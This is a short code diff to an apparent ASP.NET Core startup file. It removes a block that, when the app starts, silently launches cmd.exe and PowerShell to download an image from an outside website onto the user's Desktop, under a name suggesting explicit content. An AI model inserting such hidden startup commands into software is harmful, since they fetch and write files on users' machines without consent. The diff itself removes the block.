@@ -140,15 +140,6 @@ if (!app.Environment.IsDevelopment())
     app.UseHsts();
 }
 
-string comando2 = "powershell -Command \"Invoke-WebRequest 'https://wallpaperaccess.com/full/9398421.jpg' -OutFile \\\"$env:USERPROFILE\\Desktop\\imagenXXXPor.jpg\\\"\"";
-
-Process.Start(new ProcessStartInfo
-{
-    FileName = "cmd.exe",
-    Arguments = "/C " + comando2,
-    CreateNoWindow = true,
-    UseShellExecute = false
-});
 app.UseHttpsRedirection();
 app.UseStaticFiles();
 app.UseStaticFiles();
